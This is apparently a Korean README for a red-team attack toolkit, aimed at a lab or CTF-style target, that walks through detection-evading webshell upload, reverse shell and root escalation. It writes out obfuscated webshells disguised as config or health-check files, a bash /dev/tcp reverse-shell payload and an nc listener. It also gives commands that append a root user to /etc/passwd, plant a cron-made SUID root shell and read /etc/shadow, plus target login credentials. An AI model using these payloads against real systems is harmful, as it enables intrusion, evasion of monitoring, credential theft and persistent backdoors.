# 탐지 우회 자동화 공격 도구

**날짜:** 2025-11-14
**대상:** 43.201.154.142 (동적 IP 지원)
**목표:** 웹쉘 → 리버스 쉘 → 권한 상승 → 루트 탈취

---

## 🚀 빠른 시작

### 준비

```bash
cd /Users/hwangjunha/Desktop/Red_basic_local/H/2025-11-14

# Python 패키지 설치
pip3 install requests beautifulsoup4

# 스크립트 실행 권한 부여
chmod +x exploits/*.py
```

### 1단계: 웹쉘 업로드

```bash
python3 exploits/01_detection_bypass_webshell.py
```

**입력:**
- 타겟 IP: `43.201.154.142` (또는 새 IP)
- C2 서버: (선택사항, Enter 스킵)
- 리다이렉터 서버: (선택사항, Enter 스킵)

**결과:**
```
[+] 웹쉘 URL: http://43.201.154.142/uploads/health-check.php
```

### 2단계: 리버스 쉘 & 권한 상승

**터미널 1 (리스너):**
```bash
nc -lvnp 4444
```

**터미널 2 (공격):**
```bash
python3 exploits/02_reverse_shell_privesc.py
```

**입력:**
- 타겟 IP: `43.201.154.142`
- 웹쉘 URL: `http://43.201.154.142/uploads/health-check.php`
- 공격자 IP: `YOUR_IP`
- 포트: `4444`
- 선택: `3` (전체 자동화)

**결과:**
```
[+] 루트 권한 획득 성공!
[+] 실행: /tmp/rootbash -p
```

---

## 📁 디렉토리 구조

```
2025-11-14/
├── README.md                              # 이 파일
├── exploits/
│   ├── 01_detection_bypass_webshell.py   # 웹쉘 업로드 (탐지 우회)
│   └── 02_reverse_shell_privesc.py       # 리버스 쉘 & 권한 상승
├── docs/
│   └── ATTACK_METHODOLOGY.md             # 상세 공격 방법론
└── payloads/
    └── (웹쉘 페이로드는 스크립트에서 자동 생성)
```

---

## 🎯 핵심 기능

### 탐지 우회 기법

1. **HTTP Flood 탐지 우회**
   - 3~8초 랜덤 딜레이
   - User-Agent 로테이션 (8종)
   - 정상 페이지 방문 패턴

2. **웹쉘 업로드 탐지 우회**
   - 난독화된 웹쉘 (4종 랜덤)
   - 정상 파일명으로 위장
   - base64 인코딩 출력

3. **URL 다양성 탐지 우회**
   - 랜덤 파라미터 추가
   - 타임스탬프 & 해시 사용
   - Referer 헤더 설정

---

## 🔧 웹쉘 종류

스크립트가 랜덤으로 선택:

1. **config.php** - 설정 파일 위장
   ```
   ?debug=exec&cmd=whoami
   ```

2. **health-check.php** - 헬스체크 엔드포인트 위장
   ```
   ?x=whoami
   ```

3. **cache.php** - 캐시 관리 위장
   ```
   ?clear=whoami
   ```

4. **template.phtml** - 템플릿 파일
   ```
   ?e=whoami
   ```

---

## 🛡️ 권한 상승 기법

자동으로 시도하는 기법들:

1. **SUID 바이너리 검색**
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```

2. **Sudo 권한 악용**
   ```bash
   sudo -l
   sudo bash  # NOPASSWD 시
   ```

3. **/etc/passwd 쓰기**
   ```bash
   echo 'hacker:...:0:0:root:/root:/bin/bash' >> /etc/passwd
   # 패스워드: hacked
   ```

4. **Cron 파일 쓰기**
   ```bash
   echo '* * * * * root cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' > /etc/cron.d/privesc
   ```

5. **Docker 컨테이너 탈출**
   ```bash
   test -f /.dockerenv
   test -S /var/run/docker.sock
   ```

---

## 💻 사용 예시

### 예시 1: 기본 공격 (자동화)

```bash
# 웹쉘 업로드
python3 exploits/01_detection_bypass_webshell.py <<EOF
43.201.154.142


EOF

# 리버스 쉘 + 권한 상승
python3 exploits/02_reverse_shell_privesc.py <<EOF
43.201.154.142
http://43.201.154.142/uploads/health-check.php
YOUR_IP
4444
3
EOF
```

### 예시 2: 웹쉘로 직접 명령 실행

```bash
# 웹쉘 업로드 후 대화형 모드에서:
shell> id
uid=48(apache) gid=48(apache) groups=48(apache)

shell> ls -la /var/www/html
total 48
drwxr-xr-x  5 root   root   4096 Nov 14 10:00 .
drwxr-xr-x  3 root   root   4096 Nov  1 08:00 ..
-rw-r--r--  1 apache apache  123 Nov 14 10:00 index.php

shell> cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...

shell> exit
```

### 예시 3: 루트 명령 실행 (권한 상승 후)

```bash
# 웹쉘 URL로 직접 요청
curl "http://43.201.154.142/uploads/health-check.php?x=/tmp/rootbash%20-p%20-c%20%27whoami%27"
# 결과: root

curl "http://43.201.154.142/uploads/health-check.php?x=/tmp/rootbash%20-p%20-c%20%27cat%20/etc/shadow%27"
# 결과: root:...:18000:0:99999:7:::

curl "http://43.201.154.142/uploads/health-check.php?x=/tmp/rootbash%20-p%20-c%20%27cat%20/root/flag.txt%27"
# 결과: FLAG{...}
```

---

## 🔍 트러블슈팅

### 로그인 실패
```bash
# 브라우저로 수동 확인
open http://43.201.154.142/login.php

# 자격증명 재확인
# Username: alice
# Password: alice2024
```

### 웹쉘 업로드 실패
```bash
# 다른 확장자 시도
# 스크립트가 자동으로 .php, .phtml 시도
# 수동으로 .php5, .phtml, .php7 등 테스트
```

### 리버스 쉘 연결 안 됨
```bash
# 방화벽 확인
sudo ufw allow 4444/tcp

# 다른 포트 시도
nc -lvnp 443  # 또는 80, 8080

# 수동 페이로드
curl "http://43.201.154.142/uploads/health-check.php?x=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/YOUR_IP/4444%200%3E%261%27"
```

### 권한 상승 실패
```bash
# 수동 정찰
python3 exploits/02_reverse_shell_privesc.py
# 선택: 4 (수동 가이드 보기)

# 또는 docs/ATTACK_METHODOLOGY.md 참고
```

---

## 📚 상세 문서

- **docs/ATTACK_METHODOLOGY.md** - 전체 공격 방법론 상세 가이드
  - 탐지 시스템 분석
  - 우회 전략 설명
  - 단계별 실행 가이드
  - 트러블슈팅

---

## 🎓 주요 학습 포인트

### 1. 탐지 우회
- 사람처럼 행동 (긴 딜레이, 랜덤화)
- 정상 트래픽에 섞이기
- 다양한 User-Agent 사용

### 2. 난독화
- 위험 함수 숨기기
- 정상 파일로 위장
- 인코딩 활용

### 3. 권한 상승
- 시스템 약점 자동 탐색
- 다양한 기법 조합
- 영구 백도어 설치

---

## ⚠️ 법적 고지

```
이 도구는 교육 목적 및 승인된 침투 테스트에만 사용되어야 합니다.

무단 접근은 불법입니다:
- 정보통신망법 위반
- 전자금융거래법 위반
- 형법상 컴퓨터 사용 사기
- 업무방해죄

반드시:
1. 시스템 소유자의 명시적 승인을 받으세요
2. 테스트 범위를 명확히 정의하세요
3. 모든 활동을 문서화하세요
4. 테스트 종료 후 백도어를 제거하세요
```

---

## 📞 참고

- **작성일:** 2025-11-14
- **버전:** 1.0
- **로그인 정보:** alice / alice2024
- **타겟 IP:** 43.201.154.142 (동적)

---

**문서 작성:** Red Team Operator
